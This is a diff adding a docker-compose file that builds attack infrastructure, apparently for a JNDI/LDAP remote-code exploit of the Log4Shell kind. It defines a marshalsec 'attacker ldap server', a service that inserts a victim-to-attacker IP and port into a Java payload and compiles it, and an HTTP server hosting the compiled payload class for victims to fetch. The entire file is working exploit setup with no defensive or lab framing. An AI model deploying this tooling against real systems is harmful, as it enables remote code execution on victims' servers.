@@ -1,0 +1,34 @@
+version: "3.9"  # optional since v1.27.0
+services:
+  # attacker ldap server
+  jndi:
+    build:
+      context: .
+      dockerfile: ./marshalsec/Dockerfile
+    ports:
+      - "1389:1389"
+  # update and compile the java payload
+  payload-generator:
+    build:
+      context: .
+      dockerfile: ./payload-generator/Dockerfile
+      args:
+        VICTIM_TO_ATTACKER_PUBLIC_IP_OR_DOMAINNAME: ${VICTIM_TO_ATTACKER_PUBLIC_IP_OR_DOMAINNAME}
+        VICTIM_TO_ATTACKER_HTTP_PORT: ${VICTIM_TO_ATTACKER_HTTP_PORT}
+    volumes:
+      - ${PWD}/payload-generator:/src
+      - ${PWD}/http-dir:/http
+    command: >
+      bash -c "sed -e 's/VICTIM_TO_ATTACKER_PUBLIC_IP_OR_DOMAINNAME/${VICTIM_TO_ATTACKER_PUBLIC_IP_OR_DOMAINNAME}/g' \
+        -e 's/VICTIM_TO_ATTACKER_HTTP_PORT/${VICTIM_TO_ATTACKER_HTTP_PORT}/g' Plugin.src.java > Plugin.java \
+        && javac Plugin.java \
+        && cp Plugin.class /http/"
+  # http server for hosting attacker payloads
+  httpd:
+    image: httpd:alpine
+    depends_on:
+      - "payload-generator"
+    volumes:
+      - ${ATTACKER_HTTP_DIR}:/usr/local/apache2/htdocs/
+    ports:
+      - ${ATTACKER_HTTP_SERVER_PORT}:80
